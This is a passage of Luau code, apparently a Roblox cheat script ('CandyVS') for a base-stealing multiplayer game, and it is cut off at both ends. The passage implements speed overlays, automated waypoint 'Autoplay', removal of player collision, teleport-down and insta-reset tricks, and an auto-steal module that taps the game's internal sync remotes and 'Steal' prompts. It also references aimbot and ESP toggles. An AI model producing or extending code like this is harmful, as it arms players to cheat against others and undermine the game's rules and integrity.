	local old = head:FindFirstChild("GreenDuelsBB")
	if old then old:Destroy() end
	local oldCandyVS = head:FindFirstChild("CandyVSSpeedBill")
	if oldCandyVS then oldCandyVS:Destroy() end
	local oldOverhead = head:FindFirstChild("CandyVSOverhead")
	if oldOverhead then oldOverhead:Destroy() end
	local torso = char:FindFirstChild("UpperTorso") or char:FindFirstChild("HumanoidRootPart")
	if torso then local oldTorsoBB = torso:FindFirstChild("GreenDuelsBB")
	if oldTorsoBB then oldTorsoBB:Destroy() end end
	local bb = Instance.new("BillboardGui", head)
	bb.Name = "GreenDuelsBB"
	bb:SetAttribute("CandyVSThemeWorldAccent", true)
	bb.Size = isLocal and UDim2.fromOffset(190, 60) or UDim2.fromOffset(130, 42)
	bb.StudsOffset = isLocal and Vector3.new(0, 3.2, 0) or Vector3.new(0, 4.8, 0)
	bb.AlwaysOnTop = true
	bb.LightInfluence = 0
	bb.MaxDistance = 0

	local function applySpeedLabelStyle(lbl, localOnly)
	lbl.Font = Enum.Font.FredokaOne
	lbl.TextStrokeTransparency = 0
	if localOnly then
	lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
	local stroke = Instance.new("UIStroke", lbl)
	stroke.Color = Color3.fromRGB(0, 0, 0)
	stroke.Thickness = 1.5
	stroke.Transparency = 0.2
	local grad = Instance.new("UIGradient")
	grad.Name = "SpeedTextGradient"
	grad.Color = getSpeedThemeGradient(true)
	grad.Parent = lbl
	else
	lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
	local stroke = Instance.new("UIStroke", lbl)
	stroke.Color = Color3.fromRGB(0, 0, 0)
	stroke.Thickness = 2
	stroke.Transparency = 0.1
	local grad = Instance.new("UIGradient")
	grad.Name = "SpeedTextGradient"
	grad.Color = getSpeedThemeGradient(false)
	grad.Parent = lbl
	end
	end

	local discordLbl = Instance.new("TextLabel", bb)
	discordLbl.Size = UDim2.new(1, 0, 0, isLocal and 28 or 22)
	discordLbl.Position = UDim2.new(0, 0, 0, 0)
	discordLbl.BackgroundTransparency = 1
	discordLbl.Text = ""
	discordLbl.Visible = false
	discordLbl.TextScaled = false
	discordLbl.TextSize = isLocal and 19 or 15
	applySpeedLabelStyle(discordLbl, isLocal)

	local speedLbl = Instance.new("TextLabel", bb)
	speedLbl.Name = "SpeedBillLbl"
	speedLbl.Size = UDim2.new(1, 0, 0, isLocal and 29 or 20)
	speedLbl.Position = UDim2.new(0, 0, 0, isLocal and 30 or 22)
	speedLbl.BackgroundTransparency = 1
	local owner = Players:GetPlayerFromCharacter(char)
	speedLbl.Text = owner and getPlayerSpeedDisplayText(owner) or "0"
	if owner then speedLabelCache[owner] = speedLbl end
	speedLbl.TextScaled = false
	speedLbl.TextSize = isLocal and 22 or 16
	applySpeedLabelStyle(speedLbl, isLocal)

	_G.__CandyVSRegisterThemeRoot(bb)
	end

	local function setupForPlayer(p)
	if p.Character then requestSpeedBillboard(p.Character, p == Player) end
	_G.__CandyVSTrackConn(p.CharacterAdded:Connect(function(char) requestSpeedBillboard(char, p == Player) end))
	end

	for _, p in ipairs(Players:GetPlayers()) do
	if p ~= Player then setupForPlayer(p) end
	end
	_G.__CandyVSTrackConn(Players.PlayerAdded:Connect(function(p) setupForPlayer(p) end))
	if Player.Character then requestSpeedBillboard(Player.Character, true) end
	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function(char)
	speedToggled = toggleStates["Carry Speed"] == true
	task.spawn(function()
	requestSpeedBillboard(char, true)
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	end)
	end))

	local sbLastUpdate = 0
	local sbThrottle = 0.25
	local sbLastText = {}

	_G.__CandyVSTrackConn(RunService.Heartbeat:Connect((function(dt)
	sbLastUpdate = sbLastUpdate + (dt or 0)
	if sbLastUpdate < sbThrottle then return end
	sbLastUpdate = 0
	for _, p in ipairs(Players:GetPlayers()) do
	local char = p.Character
	if char then
	local sl = speedLabelCache[p]
	if not sl or not sl.Parent then
	speedLabelCache[p] = nil
	requestSpeedBillboard(char, p == Player)
	else
	local newText = getPlayerSpeedDisplayText(p)
	if sbLastText[p.UserId] ~= newText then
	sl.Text = newText
	sbLastText[p.UserId] = newText
	end
	end
	end
	end
	end)))
	_G.__refreshSpeedBillboards = function()
	for _, p in ipairs(Players:GetPlayers()) do
	local char = p.Character
	if char then
	local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso")
	local head = char:FindFirstChild("Head")
	local torso = char:FindFirstChild("UpperTorso") or hrp
	if hrp or head then
	local bb = (head and head:FindFirstChild("GreenDuelsBB")) or (torso and torso:FindFirstChild("GreenDuelsBB"))
	if bb then
	local sl = bb:FindFirstChild("SpeedBillLbl")
	if sl then
	speedLabelCache[p] = sl
	sl.Text = getPlayerSpeedDisplayText(p)
	do
	local gradientColor = getSpeedThemeGradient(p == Player)
	for _, child in ipairs(bb:GetChildren()) do
	if child:IsA("TextLabel") then
	local gradient = child:FindFirstChild("SpeedTextGradient")
	if gradient then gradient.Color = gradientColor end
	end
	end
	end
	end
	end
	end
	end
	end
	end

	refreshSpeedBoost()

	local autoLeftWaypoints = {
	Vector3.new(-475.86,-7,91.97), Vector3.new(-485.83,-7,97.37),
	Vector3.new(-475.86,-7,91.97), Vector3.new(-476.35,-7,27.88), Vector3.new(-477.09,-7,19.85),
	}
	local autoRightWaypoints = {
	Vector3.new(-475.84,-7,28.81), Vector3.new(-486.04,-7,23.32),
	Vector3.new(-475.51,-7,29.01), Vector3.new(-476.43,-7,91.61), Vector3.new(-476.27,-7,98.86),
	}
	_G.__autoLeftWaypoints = autoLeftWaypoints
	_G.__autoRightWaypoints = autoRightWaypoints

	local autoplayActive = false; local autoplayMode = "none"; local autoplayWPIdx = 1
	local autoplayConn = nil

	_G.__autoplayMode = _G.__autoplayMode or "Full" 

	local function getAutoplayModeForMyBase()
	local plots = workspace:FindFirstChild("Plots"); if not plots then return "left" end
	for _, plot in ipairs(plots:GetChildren()) do
	local sign = plot:FindFirstChild("PlotSign"); local yourBase = sign and sign:FindFirstChild("YourBase")
	if yourBase and yourBase.Enabled then
	local target = plot:FindFirstChild("AnimalTarget",true); local refPos = target and target.Position
	if not refPos then local delivery=plot:FindFirstChild("DeliveryHitbox"); refPos=delivery and delivery.Position end
	if refPos then
	if type(autoLeftWaypoints)=="table" and type(autoRightWaypoints)=="table" and autoLeftWaypoints[1] and autoRightWaypoints[1] then
	local leftDist=(refPos-autoLeftWaypoints[1]).Magnitude; local rightDist=(refPos-autoRightWaypoints[1]).Magnitude
	return (leftDist<=rightDist) and "right" or "left"
	end
	end
	do
	local pivotPos = nil
	if typeof(plot.GetPivot) == "function" then
	pcall(function()
	local piv = plot:GetPivot()
	if piv then pivotPos = piv.Position end
	end)
	end
	if pivotPos then
	return (pivotPos.Z>=60) and "right" or "left"
	else
	return (Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character:FindFirstChild("HumanoidRootPart").Position.Z>=60) and "right" or "left"
	end
	end
	end
	end
	return "left"
	end
	;(function()
	if _G.__ZurichSetFullNoPlayerCollision then pcall(_G.__ZurichSetFullNoPlayerCollision, false) end
	local npcEnabled = false
	local npcSuspended = false
	local npcConnections = {}
	local npcOriginalCollisions = setmetatable({}, {__mode = "k"})

	local function autoBatControlsPhysics()
	return toggleStates["TP Bat"] == true
	end

	local function disablePartCollision(part)
	if not part:IsA("BasePart") then return end
	if npcOriginalCollisions[part] == nil then
	npcOriginalCollisions[part] = {
	CanCollide = part.CanCollide,
	CanTouch = part.CanTouch,
	}
	end
	if part.CanCollide then part.CanCollide = false end
	if part.CanTouch then part.CanTouch = false end
	end

	local function disableCharacterCollisions(character)
	if not character then return end
	for _, part in ipairs(character:GetDescendants()) do
	disablePartCollision(part)
	end
	end

	local function watchCharacterCollisions(character)
	if autoBatControlsPhysics() then return end
	disableCharacterCollisions(character)
	table.insert(npcConnections, character.DescendantAdded:Connect(function(part)
	if npcEnabled and not npcSuspended and not autoBatControlsPhysics() then disablePartCollision(part) end
	end))
	end

	local function watchPlayerCollisions(plr)
	if plr == Player then return end
	if plr.Character then watchCharacterCollisions(plr.Character) end
	table.insert(npcConnections, plr.CharacterAdded:Connect(function(character)
	if npcEnabled and not npcSuspended and not autoBatControlsPhysics() then watchCharacterCollisions(character) end
	end))
	end

	local function restoreTrackedCollisions()
	for part, original in pairs(npcOriginalCollisions) do
	if part and part.Parent then
	pcall(function()
	part.CanCollide = original.CanCollide
	part.CanTouch = original.CanTouch
	end)
	end
	end
	npcOriginalCollisions = setmetatable({}, {__mode = "k"})
	end

	local alwaysOnAntiFling = (function()
	if _G.dropActive or _G.IsDropping then return end
	local character = Player.Character
	local root = character and character:FindFirstChild("HumanoidRootPart")
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	if not root or not humanoid or humanoid.Health <= 0 then return end
	local velocity = root.AssemblyLinearVelocity
	local horizontal = Vector3.new(velocity.X, 0, velocity.Z)
	local angular = root.AssemblyAngularVelocity
	local intentionalMovement = toggleStates["TP Bat"] == true
		or toggleStates["Aimbot"] == true
		or toggleStates["Lagger Aimbot"] == true
		or autoplayActive == true
	local flung = horizontal.Magnitude > 375 or math.abs(velocity.Y) > 300 or angular.Magnitude > 110
	if flung and not intentionalMovement then
	for _, part in ipairs(character:GetDescendants()) do
	if part:IsA("BasePart") then
	part.AssemblyLinearVelocity = Vector3.zero
	part.AssemblyAngularVelocity = Vector3.zero
	end
	end
	end
	end)

	local function enableNoPlayerCollision()
	if npcEnabled then return end
	npcEnabled = true
	npcSuspended = autoBatControlsPhysics()

	if not npcSuspended then
	for _, plr in ipairs(Players:GetPlayers()) do watchPlayerCollisions(plr) end
	end
	table.insert(npcConnections, Players.PlayerAdded:Connect(watchPlayerCollisions))

	table.insert(npcConnections, RunService.Stepped:Connect(function()
	if not npcEnabled then return end
	local shouldSuspend = autoBatControlsPhysics()
	if shouldSuspend then
	if not npcSuspended then
	npcSuspended = true
	restoreTrackedCollisions()
	end
	return
	end
	if npcSuspended then npcSuspended = false end
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= Player and plr.Character then
	disableCharacterCollisions(plr.Character)
	end
	end
	end))
	end

	local function disableNoPlayerCollision()
	if not npcEnabled then return end
	npcEnabled = false
	for _, connection in ipairs(npcConnections) do
	pcall(function() connection:Disconnect() end)
	end
	npcConnections = {}
	restoreTrackedCollisions()
	npcSuspended = false
	end

	_G.__ZurichSetFullNoPlayerCollision = function(active)
	if active then enableNoPlayerCollision() else disableNoPlayerCollision() end
	end
	_G.__setNoPlayerCollision = _G.__ZurichSetFullNoPlayerCollision
	_G.__getNoPlayerCollision = function() return npcEnabled end
	_G.__CandyVSTrackStopper(disableNoPlayerCollision)
_G.__CandyVSTrackConn(RunService.PostSimulation:Connect(alwaysOnAntiFling))
	enableNoPlayerCollision()
	end)()

	local function killInvisiblePart(part)
	if not part or not part:IsA("BasePart") then return end
	if part.CanCollide and (part.Transparency >= 0.9 or part.LocalTransparencyModifier >= 0.9) then
	part.CanCollide = false
	end
	end
	local function killInvisibleParts(center, radius)
	if not center then return end
	for _, part in ipairs(workspace:GetPartBoundsInRadius(center, radius)) do
	killInvisiblePart(part)
	end
	end
	_G.__killInvisibleNear = killInvisibleParts
	_G.__CandyVSTrackConn(workspace.DescendantAdded:Connect(function(part)
	if not (toggleStates["ESP Players"] or toggleStates["Player Tracers"] or toggleStates["Stretchz Res"]) then return end
	killInvisiblePart(part)
	end))
	do
	local invisibleCheckAcc = 0
	local invisibleCheckInterval = 2.0
	local invisibleGlobalAcc = 0
	local invisibleGlobalInterval = 15
	local invisibleGlobalScanCancel = nil
	_G.__CandyVSTrackConn(RunService.Heartbeat:Connect((function(dt)
	local hasVisualsActive = toggleStates["ESP Players"] or toggleStates["Player Tracers"] or toggleStates["Stretchz Res"]
	if not hasVisualsActive then return end
	invisibleCheckAcc = invisibleCheckAcc + (dt or 0)
	invisibleGlobalAcc = invisibleGlobalAcc + (dt or 0)
	if invisibleCheckAcc >= invisibleCheckInterval then
	invisibleCheckAcc = 0
	local char = Player.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if root then
	for _, part in ipairs(char:GetDescendants()) do
	killInvisiblePart(part)
	end
	local rootVelocity = root.AssemblyLinearVelocity
	local velFlat = Vector3.new(rootVelocity.X, 0, rootVelocity.Z)
	local speed = velFlat.Magnitude
	local radius = math.clamp(20 + speed * 0.2, 20, 40)
	killInvisibleParts(root.Position, radius)
	if speed > 5 then killInvisibleParts(root.Position + velFlat * 0.35, radius) end
	end
	end
	if invisibleGlobalAcc >= invisibleGlobalInterval then
	invisibleGlobalAcc = 0
	if invisibleGlobalScanCancel then invisibleGlobalScanCancel() end
	invisibleGlobalScanCancel = _G.__CandyVSWalkDescendantsBatched(workspace, killInvisiblePart, function()
	return toggleStates["ESP Players"] or toggleStates["Player Tracers"] or toggleStates["Stretchz Res"]
	end)
	end
	end)))
	end


	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function()
	awfLastRecovery = 0
	end))

	local autoplayEnabledAutoCarry = false
	local function setAutoplayAutoCarry(active)
	if active then
	if toggleStates["Auto Carry Speed"] then return end
	autoplayEnabledAutoCarry = true
	else
	if not autoplayEnabledAutoCarry then return end
	autoplayEnabledAutoCarry = false
	end

	toggleStates["Auto Carry Speed"] = active
	local setter = toggleStateSetters["Auto Carry Speed"]
	if setter then pcall(setter, active) end
	local postToggle = FeaturePostToggle["Auto Carry Speed"]
	if postToggle then pcall(postToggle, active) end
	local visual = toggleVisualUpdaters["Auto Carry Speed"]
	if visual then pcall(visual) end
	end

	local function setAutoplayToggleUI(state)
	toggleStates["Autoplay"] = state
	local setter = toggleStateSetters["Autoplay"]
	if setter then
	pcall(setter, state)
	return
	end
	local visual = toggleVisualUpdaters["Autoplay"]
	if visual then pcall(visual) end
	end

	local function stopAutoplay(keepToggle)
	if autoplayActive then
	autoplayActive = false
	autoplayMode = "none"
	autoplayWPIdx = 1
	if autoplayConn then autoplayConn:Disconnect(); autoplayConn = nil end
	local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
	if hrp then hrp.Velocity = Vector3.new(0, hrp.Velocity.Y, 0) end
	end
	setAutoplayAutoCarry(false)
	if keepToggle then return end
	if toggleStates["Autoplay"] then
	setAutoplayToggleUI(false)
	saveConfig()
	end
	end
	_G.__stopAutoplay = stopAutoplay
	_G.__CandyVSTrackStopper(stopAutoplay)

	local function startAutoplay()
	if autoplayActive then stopAutoplay(true) end
	deactivateOtherAimbots()
	if toggleStates["TP Bat"] and _G.CandyVSAutoBat then _G.CandyVSAutoBat.SetEnabled(false) end
	local mode=getAutoplayModeForMyBase(); autoplayMode=mode; autoplayWPIdx=1; autoplayActive=true
	setAutoplayAutoCarry(true)
	if not _G.__autoplayMode or (_G.__autoplayMode ~= "Full" and _G.__autoplayMode ~= "Semi") then
	_G.__autoplayMode = "Full"
	end
	if autoplayConn then autoplayConn:Disconnect() end
	autoplayConn = RunService.Heartbeat:Connect((function(dt)
	if not autoplayActive then return end
	setAutoplayAutoCarry(true)
	local waypoints=(autoplayMode=="left") and autoLeftWaypoints or autoRightWaypoints
	local stopIdx = (_G.__autoplayMode == "Semi") and 2 or #waypoints
	local wp=waypoints[autoplayWPIdx]; if not wp then return end
	local char=Player.Character; if not char then return end
	local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
	local myPos=hrp.Position
	local targetXZ=Vector3.new(wp.X,0,wp.Z); local myXZ=Vector3.new(myPos.X,0,myPos.Z)
	local dXZ=(targetXZ-myXZ).Magnitude
	if dXZ<=1.1 then
	hrp.Velocity=Vector3.new(0,hrp.Velocity.Y,0)
	if autoplayWPIdx>=stopIdx then
	if Player:GetAttribute("Stealing") ~= true then stopAutoplay() end
	return
	end
	autoplayWPIdx=autoplayWPIdx+1
	else
	local dir=(targetXZ-myXZ); if dir.Magnitude>0.001 then dir=dir.Unit end
	local speed = shouldUseStealSpeed(autoplayWPIdx > 2) and getSelectedStealSpeed() or getSelectedBoostSpeed()
	speed = speed + 1
	if dXZ<1.5 then speed=speed*math.clamp(dXZ/1.5,0.6,1) end
	speed=math.min(speed,dXZ/math.max(dt or 1/60,1/240))
	hrp.Velocity=Vector3.new(dir.X*speed,hrp.Velocity.Y,dir.Z*speed)
	end
	end))
	end

	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function() task.wait(0.5); if autoplayActive then startAutoplay() end end))
	FeaturePostToggle["Autoplay"] = function(active)
	if active then
	setAutoplayAutoCarry(true)
	_G.__checkAndAutoDrop(function()
	startAutoplay()
	end)
	else
	stopAutoplay()
	end
	end
	FeatureToggles["Autoplay"] = function()
	toggleStates["Autoplay"]=not toggleStates["Autoplay"]
	if toggleStates["Autoplay"] then
	setAutoplayAutoCarry(true)
	_G.__checkAndAutoDrop(function()
	startAutoplay()
	end)
	else
	stopAutoplay()
	end
	if toggleVisualUpdaters["Autoplay"] then toggleVisualUpdaters["Autoplay"]() end
	saveConfig()
	end
	if toggleStates["Autoplay"] then startAutoplay() end

	do
	local TP_DOWN_COOLDOWN = 0.10
	local lastTPDownAt = 0
	local tpDownPending = false
	local tpDownGeneration = 0
	local tpDownAlive = true
	local function cancelPendingTPDown()
	tpDownGeneration = tpDownGeneration + 1
	tpDownPending = false
	end
	_G.__CandyVSTrackConn(Player.CharacterRemoving:Connect(cancelPendingTPDown))
	_G.__CandyVSTrackStopper(function()
	tpDownAlive = false
	cancelPendingTPDown()
	end)
	local function executeTPDown()
	if not tpDownAlive or _G.dropActive or _G.IsDropping then return end
	local now = os.clock()
	local remaining = TP_DOWN_COOLDOWN - (now - lastTPDownAt)
	if remaining > 0 then
	if not tpDownPending then
	tpDownPending = true
	local generation = tpDownGeneration
	local pendingCharacter = Player.Character
	task.delay(remaining, function()
	if generation ~= tpDownGeneration or Player.Character ~= pendingCharacter then return end
	tpDownPending = false
	executeTPDown()
	end)
	end
	return
	end
	local char = Player.Character
	if not char then return end
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum or hum.Health <= 0 or hrp.Anchored or hum.Sit or hum.SeatPart then return end
	lastTPDownAt = os.clock()
	cancelPendingTPDown()

	local _, yaw = hrp.CFrame:ToEulerAnglesYXZ()
	pcall(function()
	hrp.CFrame = CFrame.new(hrp.Position.X, -7, hrp.Position.Z)
	* CFrame.Angles(0, yaw, 0)
	hrp.AssemblyLinearVelocity = Vector3.zero
	end)
	end

	_G["ExecuteTPDown"] = executeTPDown
	FeatureToggles["TP Down"] = executeTPDown

	do
	_G.__loadInstaReset = true
	local RESET_MAX_DURATION = 0.05
	local resetCooldown = false
	local resetThread = nil
	local currentCharacter = nil
	local resetSuccessful = false
	local stopResetSequence = false

	local function doInstaReset()
	if resetCooldown then return end
	resetCooldown = true
	resetSuccessful = false
	stopResetSequence = false
	local character = Player.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	if not character or not humanoid then
	resetCooldown = false
	return
	end

	currentCharacter = character
	resetThread = task.spawn(function()
	local attempts = 0
	local maxAttempts = 40
	local originalHipHeight = humanoid.HipHeight

	while character and character.Parent and humanoid and humanoid.Health > 0
	and Player.Character == character and not stopResetSequence do
	pcall(function()
	humanoid.HipHeight = 1e30
	humanoid.AutoRotate = true
	local rootPart = character:FindFirstChild("HumanoidRootPart")
	if rootPart then rootPart.CanCollide = false end
	for _, part in ipairs(character:GetChildren()) do
	if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
	part.CanCollide = false
	end
	end
	end)
	if not character.Parent or humanoid.Health <= 0 or Player.Character ~= character then
	resetSuccessful = true
	break
	end
	attempts = attempts + 1
	if attempts >= maxAttempts then break end
	task.wait(RESET_MAX_DURATION)
	end

	if not resetSuccessful and character and character.Parent and humanoid.Health > 0
	and Player.Character == character then
	pcall(function() humanoid.Health = 0 end)
	task.wait(0.1)
	if not character.Parent or humanoid.Health <= 0 then resetSuccessful = true end
	end

	if not resetSuccessful and character and character.Parent and humanoid then
	pcall(function()
	humanoid.HipHeight = originalHipHeight
	local rootPart = character:FindFirstChild("HumanoidRootPart")
	if rootPart then rootPart.CanCollide = true end
	for _, part in ipairs(character:GetChildren()) do
	if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
	part.CanCollide = true
	end
	end
	end)
	end

	resetCooldown = false
	resetThread = nil
	currentCharacter = nil
	stopResetSequence = false
	end)
	end

	local function stopInstaReset()
	stopResetSequence = true
	if resetThread then
	pcall(task.cancel, resetThread)
	resetThread = nil
	end
	resetCooldown = false
	currentCharacter = nil
	end

	FeatureToggles["Insta Reset"] = doInstaReset
	_G.__CandyVSInstaReset = doInstaReset
	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function()
	stopInstaReset()
	resetSuccessful = false
	stopResetSequence = false
	end))
	_G.__CandyVSTrackConn(RunService.Heartbeat:Connect(function()
	local character = Player.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	if (humanoid and humanoid.Health <= 0)
	or (currentCharacter and character ~= currentCharacter) then
	resetSuccessful = true
	if resetThread then
	pcall(task.cancel, resetThread)
	resetThread = nil
	end
	resetCooldown = false
	currentCharacter = nil
	end
	end))
	_G.__CandyVSTrackStopper(function()
	stopInstaReset()
	end)
	end

	local autoTPDownElapsed = 0
	local autoTPDownTriggered = false
	local autoTPDownRoot = nil
	local autoTPDownRaycast = RaycastParams.new()
	autoTPDownRaycast.FilterType = Enum.RaycastFilterType.Exclude
	pcall(function() autoTPDownRaycast.RespectCanCollide = true end)
	FeaturePostToggle["Auto TP Down"] = function(active)
	if not active then
	autoTPDownElapsed = 0
	autoTPDownTriggered = false
	autoTPDownRoot = nil
	end
	end
	_G.__CandyVSTrackConn(RunService.Heartbeat:Connect((function(dt)
	if toggleStates["Auto TP Down"] ~= true then return end
	if _G.dropActive or _G.IsDropping then
	autoTPDownElapsed = 0
	return
	end
	autoTPDownElapsed = autoTPDownElapsed + (dt or 0)
	if autoTPDownElapsed < 0.10 then return end
	autoTPDownElapsed = 0
	local char = Player.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not root or not hum or hum.Health <= 0 then
	autoTPDownTriggered = false
	autoTPDownRoot = nil
	return
	end
	if root ~= autoTPDownRoot then
	autoTPDownRoot = root
	autoTPDownTriggered = false
	end
	local threshold = math.clamp(tonumber(speedValues.AutoTPDownHeight) or 20, 1, 1000)
	autoTPDownRaycast.FilterDescendantsInstances = { char }
	local result = workspace:Raycast(root.Position, Vector3.new(0, -2048, 0), autoTPDownRaycast)
	local height = result and math.max(0, root.Position.Y - result.Position.Y) or nil
	local reachedHeight = height ~= nil and height >= threshold
	if reachedHeight and not autoTPDownTriggered then
	autoTPDownTriggered = true
	executeTPDown()
	elseif not reachedHeight then
	autoTPDownTriggered = false
	end
	end)))
	end
	do
	local _dropDropActive = false
	local _dropConn = nil

	local DROP_ASCEND_DURATION = 0.2
	local DROP_ASCEND_SPEED = 150

	local function drop()
	if _dropDropActive then return end
	local char = Player.Character; if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
	if _dropConn then _dropConn:Disconnect(); _dropConn = nil end

	local DROP_TARGET_Y = root.Position.Y
	_dropDropActive = true
	_G.dropActive = true
	_G.IsDropping = true
	local t0 = tick()

	_dropConn = RunService.Heartbeat:Connect(function()
	local r = char and char:FindFirstChild("HumanoidRootPart")
	if not r then
	_dropConn:Disconnect(); _dropConn = nil
	_dropDropActive = false
	_G.dropActive = false
	_G.IsDropping = false
	return
	end

	if tick() - t0 >= DROP_ASCEND_DURATION then
	_dropConn:Disconnect(); _dropConn = nil

	local _, yaw = r.CFrame:ToEulerAnglesYXZ()
	r.CFrame = CFrame.new(r.Position.X, DROP_TARGET_Y, r.Position.Z)
	* CFrame.Angles(0, yaw, 0)
	r.AssemblyLinearVelocity = Vector3.zero
	pcall(function() r.Velocity = Vector3.zero end)

	_dropDropActive = false
	_G.dropActive = false
	_G.IsDropping = false
	return
	end

	r.AssemblyLinearVelocity = Vector3.new(
	r.AssemblyLinearVelocity.X,
	DROP_ASCEND_SPEED,
	r.AssemblyLinearVelocity.Z
	)
	end)
	end

	FeatureToggles["Drop"] = drop
	_G.doDrop = drop
	end

	local function checkAndAutoDrop(callback)
	ragdollCounterPaused = true
	local function unpauseRagdollCounter()
	ragdollCounterPaused = false
	end
	if Player:GetAttribute("Stealing") then
	local char = Player.Character
	if not char then
	if callback then callback() end
	unpauseRagdollCounter()
	return
	end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hum or not hrp then
	if callback then callback() end
	unpauseRagdollCounter()
	return
	end

	if FeatureToggles["Drop"] then
	FeatureToggles["Drop"]()
	local start = tick()
	while Player:GetAttribute("Stealing") and (tick() - start) < 5 do
	task.wait()
	end
	end

	if callback then
	callback()
	end
	unpauseRagdollCounter()
	else
	if callback then
	callback()
	end
	unpauseRagdollCounter()
	end
	end
	_G.__checkAndAutoDrop = checkAndAutoDrop
	end


	local v1Progress = 0
	local V2 = { busy = false, data = {} }

	do
	local LP = Player
	local plots = workspace:WaitForChild("Plots")

	local AnimalsData = {}
	local syncRemotes = nil
	local plotAnimalSync = { caches = {}, connections = {} }
	local allAnimalsCache = {}
	local InternalStealCache = {}
	local stealConnection = nil
	local syncStarted = false
	local syncLoopStarted = false
	local _stealDetectConns = {}
	local _stealDetectTimer = nil
	local autoStealGeneration = 0

	local CONFIG_AUTO_STEAL = {
	AUTO_STEAL_ENABLED = false,
	HOLD_MIN = 1.3,
	HOLD_MAX = 2.6,
	ENTRY_DELAY = 0.01,
	COOLDOWN = 0.05,
	STEAL_RANGE = 6,
	PRIME_RANGE = math.clamp(tonumber(autoStealValues.Radius) or 65, 10, 150),
	}
	local stealPromptCache = setmetatable({}, { __mode = "k" })
	local function getCachedStealPrompt(spawn)
	if not spawn then return nil end
	local cached = stealPromptCache[spawn]
	if cached and cached.Parent and cached:IsA("ProximityPrompt") and cached.ActionText and cached.ActionText:find("Steal") then
	return cached
	end
	local promptAttachment = spawn:FindFirstChild("PromptAttachment")
	local candidates = promptAttachment and promptAttachment:GetChildren() or spawn:GetDescendants()
	for _, candidate in ipairs(candidates) do
	if candidate:IsA("ProximityPrompt") and candidate.ActionText and candidate.ActionText:find("Steal") then
	stealPromptCache[spawn] = candidate
	return candidate
	end
	end
	stealPromptCache[spawn] = nil
	return nil
	end

	local StealState = {
	active = false,
	startTime = 0,
	phase = "idle",
	label = "",
	lastResult = "",
	lastResultTime = 0,
	totalSteals = 0,
	failedSteals = 0,
	}

	local State = _G.__CandyVSAutoStealState or { isStealing = false }
	_G.__CandyVSAutoStealState = State

	local function setStealState(on)
	on = on == true
	if State.isStealing == on then return end
	State.isStealing = on
	end

	local function initializeAutoStealSync()
	if syncRemotes then return true end
	local ok = pcall(function()
	local Packages = ReplicatedStorage:WaitForChild("Packages", 10)
	local Datas = ReplicatedStorage:WaitForChild("Datas", 10)
	if not Packages or not Datas then return end
	AnimalsData = require(Datas:WaitForChild("Animals"))
	local folder = Packages:WaitForChild("Synchronizer")
	syncRemotes = {
	channelFolder = folder:WaitForChild("Channel"),
	routeRemote = folder:WaitForChild("CommunicationRoute"),
	requestData = folder:FindFirstChild("RequestData"),
	}
	end)
	return ok and syncRemotes ~= nil
	end

	local function splitSyncPath(path)
	if typeof(path) == "table" then return path end
	local out = {}
	for part in string.gmatch(tostring(path), "[^%.]+") do
	table.insert(out, tonumber(part) or part)
	end
	return out
	end

	local function resolveSyncPath(path, root)
	local current = root
	local parent = nil
	local key = nil
	for _, part in ipairs(splitSyncPath(path)) do
	parent = current
	key = part
	current = current and current[part] or nil
	end
	return current, parent, key
	end

	local function applyPlotSyncDiff(channelName, packet)
	local cache = plotAnimalSync.caches[channelName]
	if typeof(cache) ~= "table" then return end
	local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
	local current, parent, key = resolveSyncPath(path, cache)
	if action == "Changed" then
	if parent ~= nil then parent[key] = a end
	elseif action == "ArrayInsert" then
	if current ~= nil then table.insert(current, b, a) end
	elseif action == "ArrayRemoved" then
	if current ~= nil then table.remove(current, b) end
	elseif action == "DictionaryInsert" then
	if current ~= nil then current[b] = a end
	elseif action == "DictionaryRemoved" then
	if current ~= nil then current[b] = nil end
	end
	end

	local function attachPlotChannel(remote)
	if not syncRemotes or plotAnimalSync.connections[remote] then return end
	local channelName = tostring(remote.Name)
	if not plots:FindFirstChild(channelName) then return end
	if syncRemotes.requestData and plotAnimalSync.caches[channelName] == nil then
	local ok, data = pcall(function() return syncRemotes.requestData:InvokeServer(channelName) end)
	plotAnimalSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
	elseif plotAnimalSync.caches[channelName] == nil then
	plotAnimalSync.caches[channelName] = {}
	end
	plotAnimalSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
	for _, packet in ipairs(queue) do applyPlotSyncDiff(channelName, packet) end
	end)
	end

	local function detachPlotChannel(channelName)
	for remote, conn in pairs(plotAnimalSync.connections) do
	if tostring(remote.Name) == tostring(channelName) then
	conn:Disconnect()
	plotAnimalSync.connections[remote] = nil
	plotAnimalSync.caches[tostring(channelName)] = nil
	break
	end
	end
	end

	local function startAutoStealSync()
	if syncStarted then return true end
	if not initializeAutoStealSync() then return false end
	if not syncRemotes or not syncRemotes.channelFolder then return false end
	for _, child in ipairs(syncRemotes.channelFolder:GetChildren()) do
	if child:IsA("RemoteEvent") then attachPlotChannel(child) end
	end
	syncRemotes.channelFolder.ChildAdded:Connect(function(child)
